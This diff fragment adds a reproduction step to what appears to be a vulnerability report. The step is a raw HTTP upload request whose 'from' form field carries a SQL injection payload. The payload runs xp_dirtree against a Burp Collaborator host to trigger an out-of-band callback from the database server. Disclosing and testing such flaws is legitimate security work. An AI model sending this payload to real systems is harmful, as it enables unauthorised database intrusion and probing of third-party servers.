@@ -39,3 +39,27 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/a
 Accept-Encoding: gzip, deflate, br
 Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
 Cookie: _ga=GA1.2.1697249984.1548431559
+
+4)
+
+POST /FileTransfer/Upload HTTP/1.1
+Host: www.███
+Connection: close
+Content-Length: 269
+Cache-Control: max-age=0
+Origin: https://www.████
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybjrDo2DV1yHQWvAQ
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+DNT: 1
+Referer: https://www.█████████/FileTransfer/
+Accept-Language: en-GB,en-US;q=0.8,en;q=0.6,fr;q=0.4
+
+------WebKitFormBoundarybjrDo2DV1yHQWvAQ
+Content-Disposition: form-data; name="from"
+
+hello';declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- 
+------WebKitFormBoundarybjrDo2DV1yHQWvAQ
+
+
